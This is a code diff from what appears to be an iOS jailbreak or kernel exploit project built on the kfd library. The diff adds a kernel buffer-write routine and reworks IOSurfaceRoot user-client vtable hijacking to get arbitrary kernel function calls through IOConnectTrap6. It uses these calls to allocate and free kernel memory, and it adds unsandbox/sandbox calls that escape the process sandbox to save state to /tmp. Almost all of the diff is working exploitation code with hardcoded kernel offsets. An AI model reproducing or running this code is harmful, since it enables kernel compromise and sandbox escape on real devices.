@@ -9,13 +9,17 @@
 #import "krw.h"
 #import "libkfd.h"
 #import "offsets.h"
+#import "sandbox.h"
 
 uint64_t _kfd = 0;
 
+uint64_t _fake_vtable = 0;
+uint64_t _fake_client = 0;
+mach_port_t _user_client = 0;
+
 uint64_t do_kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method)
 {
-    printf("do_kopen arg: 0x%llx, 0x%llx, 0x%llx, 0x%llx\n", puaf_pages, puaf_method, kread_method, kwrite_method);
-    _kfd = kopen(puaf_pages, puaf_method, kread_method, kwrite_method);//kopen_intermediate(puaf_pages, puaf_method, kread_method, kwrite_method);
+    _kfd = kopen(puaf_pages, puaf_method, kread_method, kwrite_method);
     return _kfd;
 }
 
@@ -35,7 +39,6 @@ void do_kwrite(void* uaddr, uint64_t kaddr, uint64_t size)
 }
 
 uint64_t get_kslide(void) {
-    //kfd->info.kernel.kernel_slide
     return ((struct kfd*)_kfd)->info.kernel.kernel_slide;
 }
 
@@ -119,6 +122,35 @@ void kreadbuf(uint64_t kaddr, void* output, size_t size)
     }
 }
 
+void kwritebuf(uint64_t kaddr, void* input, size_t size)
+{
+    uint64_t endAddr = kaddr + size;
+    uint32_t inputOffset = 0;
+    unsigned char* inputBytes = (unsigned char*)input;
+    
+    for(uint64_t curAddr = kaddr; curAddr < endAddr; curAddr += 4)
+    {
+        uint32_t toWrite = 0;
+        int bc = 4;
+        
+        uint64_t remainingBytes = endAddr - curAddr;
+        if(remainingBytes < 4)
+        {
+            toWrite = kread32(curAddr);
+            bc = (int)remainingBytes;
+        }
+        
+        unsigned char* wb = (unsigned char*)&toWrite;
+        for(int i = 0; i < bc; i++)
+        {
+            wb[i] = inputBytes[inputOffset];
+            inputOffset++;
+        }
+
+        kwrite32(curAddr, toWrite);
+    }
+}
+
 uint64_t zm_fix_addr_kalloc(uint64_t addr) {
     //se2 15.0.2 = 0xFFFFFFF00782E718, 6s 15.1 = 0xFFFFFFF0071024B8; guess what is that address xD
     uint64_t kmem = 0xFFFFFFF0071024B8 + get_kslide();
@@ -129,7 +161,7 @@ uint64_t zm_fix_addr_kalloc(uint64_t addr) {
 }
 
 //Thanks @Mineek!
-uint64_t init_kcall(uint64_t *_fake_vtable, uint64_t *_fake_client, mach_port_t *_user_client) {
+uint64_t init_kcall(void) {
     uint64_t add_x0_x0_0x40_ret_func = off_add_x0_x0_0x40_ret + get_kslide();
     
     io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
@@ -137,86 +169,52 @@ uint64_t init_kcall(uint64_t *_fake_vtable, uint64_t *_fake_client, mach_port_t 
       printf(" [-] unable to find service\n");
       exit(EXIT_FAILURE);
     }
-    mach_port_t user_client;
-    kern_return_t err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
+    _user_client = 0;
+    kern_return_t err = IOServiceOpen(service, mach_task_self(), 0, &_user_client);
     if (err != KERN_SUCCESS){
       printf(" [-] unable to get user client connection\n");
       exit(EXIT_FAILURE);
     }
-    uint64_t uc_port = port_name_to_ipc_port(user_client);
+    uint64_t uc_port = port_name_to_ipc_port(_user_client);
     uint64_t uc_addr = kread64(uc_port + 0x58);    //#define IPC_PORT_IP_KOBJECT_OFF
     uint64_t uc_vtab = kread64(uc_addr);
-    uint64_t fake_vtable = off_empty_kdata_page + get_kslide();
+    
+    if(_fake_vtable == 0) _fake_vtable = off_empty_kdata_page + get_kslide();
+    
     for (int i = 0; i < 0x200; i++) {
-        kwrite64(fake_vtable+i*8, kread64(uc_vtab+i*8));
+        kwrite64(_fake_vtable+i*8, kread64(uc_vtab+i*8));
     }
-    uint64_t fake_client = off_empty_kdata_page + get_kslide() + 0x1000;
+    
+    if(_fake_client == 0) _fake_client = off_empty_kdata_page + get_kslide() + 0x1000;
+    
     for (int i = 0; i < 0x200; i++) {
-        kwrite64(fake_client+i*8, kread64(uc_addr+i*8));
+        kwrite64(_fake_client+i*8, kread64(uc_addr+i*8));
     }
-    kwrite64(fake_client, fake_vtable);
-    kwrite64(uc_port + 0x58, fake_client);    //#define IPC_PORT_IP_KOBJECT_OFF
-    kwrite64(fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);
-
-    *_fake_vtable = fake_vtable;
-    *_fake_client = fake_client;
-    *_user_client = user_client;
+    kwrite64(_fake_client, _fake_vtable);
+    kwrite64(uc_port + 0x58, _fake_client);    //#define IPC_PORT_IP_KOBJECT_OFF
+    kwrite64(_fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);
 
     return 0;
 }
 
-uint64_t init_kcall_allocated(uint64_t _fake_vtable, uint64_t _fake_client, mach_port_t *_user_client) {
-    uint64_t add_x0_x0_0x40_ret_func = off_add_x0_x0_0x40_ret + get_kslide();
-
-    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
-    if (service == IO_OBJECT_NULL){
-      printf(" [-] unable to find service\n");
-      exit(EXIT_FAILURE);
-    }
-    mach_port_t user_client;
-    kern_return_t err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
-    if (err != KERN_SUCCESS){
-      printf(" [-] unable to get user client connection\n");
-      exit(EXIT_FAILURE);
-    }
-    uint64_t uc_port = port_name_to_ipc_port(user_client);
-    uint64_t uc_addr = kread64(uc_port + 0x58);    //#define IPC_PORT_IP_KOBJECT_OFF (0x68)
-    uint64_t uc_vtab = kread64(uc_addr);
-    uint64_t fake_vtable = _fake_vtable;
-    for (int i = 0; i < 0x200; i++) {
-        kwrite64(fake_vtable+i*8, kread64(uc_vtab+i*8));
-    }
-    uint64_t fake_client = _fake_client;
-    for (int i = 0; i < 0x200; i++) {
-        kwrite64(fake_client+i*8, kread64(uc_addr+i*8));
-    }
-    kwrite64(fake_client, fake_vtable);
-    kwrite64(uc_port + 0x58, fake_client);    //#define IPC_PORT_IP_KOBJECT_OFF (0x68)
-    kwrite64(fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);
-
-    *_user_client = user_client;
-
-    return 0;
-}
-
-uint64_t kcall(mach_port_t user_client, uint64_t fake_client, uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
-    uint64_t offx20 = kread64(fake_client+0x40);
-    uint64_t offx28 = kread64(fake_client+0x48);
-    kwrite64(fake_client+0x40, x0);
-    kwrite64(fake_client+0x48, addr);
-    uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
-    kwrite64(fake_client+0x40, offx20);
-    kwrite64(fake_client+0x48, offx28);
+uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
+    uint64_t offx20 = kread64(_fake_client+0x40);
+    uint64_t offx28 = kread64(_fake_client+0x48);
+    kwrite64(_fake_client+0x40, x0);
+    kwrite64(_fake_client+0x48, addr);
+    uint64_t returnval = IOConnectTrap6(_user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
+    kwrite64(_fake_client+0x40, offx20);
+    kwrite64(_fake_client+0x48, offx28);
     return returnval;
 }
 
-uint64_t kalloc(mach_port_t user_client, uint64_t fake_client, size_t ksize) {
-    uint64_t allocated_kmem = kcall(user_client, fake_client, off_kalloc_data_external + get_kslide(), ksize, 1, 0, 0, 0, 0, 0);
+uint64_t kalloc(size_t ksize) {
+    uint64_t allocated_kmem = kcall(off_kalloc_data_external + get_kslide(), ksize, 1, 0, 0, 0, 0, 0);
     return zm_fix_addr_kalloc(allocated_kmem);
 }
 
-void kfree(mach_port_t user_client, uint64_t fake_client, uint64_t kaddr, size_t ksize) {
-    kcall(user_client, fake_client, off_kfree_data_external + get_kslide(), kaddr, ksize, 0, 0, 0, 0, 0);
+void kfree(uint64_t kaddr, size_t ksize) {
+    kcall(off_kfree_data_external + get_kslide(), kaddr, ksize, 0, 0, 0, 0, 0);
 }
 
 uint64_t clean_dirty_kalloc(uint64_t addr, size_t size) {
@@ -226,24 +224,59 @@ uint64_t clean_dirty_kalloc(uint64_t addr, size_t size) {
     return 0;
 }
 
-int kalloc_using_empty_kdata_page(uint64_t* _fake_vtable, uint64_t* _fake_client) {
+int kalloc_using_empty_kdata_page(void) {
     uint64_t add_x0_x0_0x40_ret_func = off_add_x0_x0_0x40_ret + get_kslide();
 
-    uint64_t fake_vtable, fake_client = 0;
-    mach_port_t user_client = 0;
-    init_kcall(&fake_vtable, &fake_client, &user_client);
+    init_kcall();
 
-    uint64_t allocated_kmem = kalloc(user_client, fake_client, 0x1000);
-    *_fake_vtable = allocated_kmem;
+    uint64_t allocated_kmem[2] = {0, 0};
+    allocated_kmem[0] = kalloc(0x1000);
+    allocated_kmem[1] = kalloc(0x1000);
 
-    allocated_kmem = kalloc(user_client, fake_client, 0x1000);
-    *_fake_client = allocated_kmem;
-
-    mach_port_deallocate(mach_task_self(), user_client);
+    mach_port_deallocate(mach_task_self(), _user_client);
+    _user_client = 0;
     usleep(10000);
 
-    clean_dirty_kalloc(fake_vtable, 0x1000);
-    clean_dirty_kalloc(fake_client, 0x1000);
+    clean_dirty_kalloc(_fake_vtable, 0x1000);
+    clean_dirty_kalloc(_fake_client, 0x1000);
+    
+    _fake_vtable = allocated_kmem[0];
+    _fake_client = allocated_kmem[1];
 
+    return 0;
+}
+
+int prepare_kcall(void) {
+    NSString* save_path = @"/tmp/kfd-arm64.plist";
+    if(access(save_path.UTF8String, F_OK) == 0) {
+        uint64_t sb = unsandbox(getpid());
+        NSDictionary *kcalltest14_dict = [NSDictionary dictionaryWithContentsOfFile:save_path];
+        _fake_vtable = [kcalltest14_dict[@"kcall_fake_vtable"] unsignedLongLongValue];
+        _fake_client = [kcalltest14_dict[@"kcall_fake_client"] unsignedLongLongValue];
+        sandbox(getpid(), sb);
+    } else {
+        kalloc_using_empty_kdata_page();
+        //Once if you successfully get kalloc to use fake_vtable and fake_client,
+        //DO NOT use dirty_kalloc again since unstable method.
+        uint64_t sb = unsandbox(getpid());
+        
+        NSDictionary *dictionary = @{
+            @"kcall_fake_vtable": @(_fake_vtable),
+            @"kcall_fake_client": @(_fake_client)
+        };
+        
+        BOOL success = [dictionary writeToFile:save_path atomically:YES];
+        if (!success) {
+            printf("[-] Failed createPlistAtPath.\n");
+            return -1;
+        }
+        
+        sandbox(getpid(), sb);
+        printf("Saved fake_vtable, fake_client for kcall.\n");
+        printf("fake_vtable: 0x%llx, fake_client: 0x%llx\n", _fake_vtable, _fake_client);
+    }
+    
+    init_kcall();
+    
     return 0;
 }
